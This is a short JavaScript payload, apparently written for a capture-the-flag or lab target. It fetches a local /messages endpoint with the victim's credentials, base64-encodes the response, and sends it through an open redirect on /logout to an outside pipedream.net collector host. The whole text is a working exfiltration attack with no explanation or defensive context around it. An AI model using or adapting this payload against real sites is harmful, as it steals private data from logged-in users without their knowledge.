fetch("http://127.0.0.1:5002/messages", {
  method: "GET",
  credentials: "include"
})
  .then(r => r.text())
  .then(txt => {
    console.log(txt); 
    document.location = '/logout?next=https://eoeipamgnflz15n.m.pipedream.net/' + btoa(txt)
  })
  .catch(console.error);
